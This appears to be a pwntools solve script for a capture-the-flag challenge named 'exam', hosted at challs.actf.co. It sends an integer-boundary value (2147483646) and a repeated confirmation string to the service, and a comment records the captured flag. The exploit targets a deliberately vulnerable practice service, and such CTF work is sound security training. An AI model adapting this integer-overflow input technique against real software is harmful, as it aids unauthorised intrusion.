#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug' 

p = process('./exam')
p = remote("challs.actf.co", 31322)

p.sendlineafter(b': ', b'2147483646')
payload = b'I confirm that I am taking this exam between the dates 5/24/2024 and 5/27/2024. I will not disclose any information about any section of this exam.'
p.sendlineafter(b': ', payload)
p.sendlineafter(b': ', payload)
p.sendlineafter(b': ', payload)

p.interactive()
# actf{manifesting_those_fives}